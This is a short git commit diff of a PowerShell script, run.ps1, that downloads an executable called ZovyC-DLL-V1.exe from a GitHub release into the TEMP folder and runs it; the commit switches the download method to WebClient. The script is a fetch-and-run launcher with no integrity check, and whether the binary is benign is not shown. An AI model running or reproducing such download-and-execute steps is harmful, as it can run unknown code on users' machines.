fee89be6d2b913fb30ca81ce0cb062f3acfa489f
joker55za66-ops <joker55za66@gmail.com>
2026-05-13 03:47:05 +0700

    run.ps1

--- run.ps1
+++ run.ps1
@@ -1,9 +1,7 @@
-$ProgressPreference = 'SilentlyContinue'
-
 $file = "$env:TEMP\ZovyC-DLL-V1.exe"
 
 $url = "https://github.com/joker55za66-ops/ZovyC-DLL-V1/releases/download/v1/ZovyC-DLL-V1.exe"
 
-Invoke-WebRequest $url -OutFile $file
+(New-Object System.Net.WebClient).DownloadFile($url, $file)
 
 Start-Process $file
